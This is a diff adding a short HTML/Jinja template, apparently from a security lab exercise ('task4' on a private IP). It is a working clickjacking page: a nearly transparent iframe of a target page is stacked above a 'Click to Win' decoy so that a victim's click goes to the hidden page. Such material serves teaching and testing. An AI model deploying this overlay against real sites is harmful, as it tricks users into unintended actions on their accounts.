@@ -1,0 +1,28 @@
+{%extends 'base.html'%}
+
+{%block title%}
+ Корпоративная сеть
+{%endblock%}
+
+{%block main%}
+
+<style>
+    iframe {
+        position: relative;
+        width: 800;
+        height: 600;
+        opacity: 0.1;
+        z-index: 2;
+    }
+    div {
+        position: absolute;
+        top: 100;
+        left: 100;
+        z-index: 1;
+    }
+</style>
+
+<iframe src="http://10.10.102.119:81/task4"></iframe>
+<div>Click to Win</div>
+   
+{%endblock%}
